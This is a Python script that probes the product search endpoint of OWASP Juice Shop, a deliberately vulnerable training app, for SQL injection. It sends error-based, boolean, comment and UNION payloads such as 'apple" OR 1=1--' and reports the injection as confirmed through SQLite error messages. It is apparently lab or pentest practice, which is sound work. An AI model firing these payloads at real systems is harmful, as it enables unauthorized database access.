import requests
import sys

def test_sqli():
    """Test SQL injection vulnerability in /rest/products/search endpoint"""
    base_url = "http://host.docker.internal:3000"
    endpoint = "/rest/products/search"

    test_cases = [
        {
            "name": "Single quote error-based injection",
            "payload": "apple'",
            "expected_status": 500,
            "expected_error": "SQLITE_ERROR"
        },
        {
            "name": "Boolean-based injection (double quote)",
            "payload": "apple\" OR 1=1--",
            "expected_status": 200,
            "expected_data": []
        },
        {
            "name": "SQL comment test",
            "payload": "apple'--",
            "expected_status": 500,
            "expected_error": "SQLITE_ERROR"
        },
        {
            "name": "Union injection attempt",
            "payload": "apple\" UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            "expected_status": 200,
            "expected_data": []
        }
    ]

    print("SQL Injection Test Results for OWASP Juice Shop")
    print("=" * 60)

    for test in test_cases:
        try:
            response = requests.get(base_url + endpoint, params={"q": test["payload"]}, timeout=10)
            print(f"\nTest: {test['name']}")
            print(f"Payload: {test['payload']}")
            print(f"Status Code: {response.status_code}")

            if response.status_code == test["expected_status"]:
                print("✓ Status code matches expected")
            else:
                print(f"✗ Unexpected status code (expected {test['expected_status']})")

            if response.status_code == 500:
                if "SQLITE_ERROR" in response.text:
                    print("✓ SQLITE_ERROR detected - SQL injection confirmed")
                    print(f"Error message: {response.text[:150]}...")
                else:
                    print("✗ No SQLITE_ERROR in response")
            elif response.status_code == 200:
                try:
                    data = response.json()
                    if "data" in data and isinstance(data["data"], list):
                        print(f"✓ JSON response received, data array length: {len(data['data'])}")
                except:
                    print(f"Response: {response.text[:150]}...")

        except Exception as e:
            print(f"\nTest failed: {test['name']}")
            print(f"Error: {e}")

    print("\n" + "=" * 60)
    print("Vulnerability confirmed: SQL injection in /rest/products/search")
    print("Database: SQLite (confirmed via error messages)")
    print("Attack vector: GET parameter 'q'")

if __name__ == "__main__":
    test_sqli()
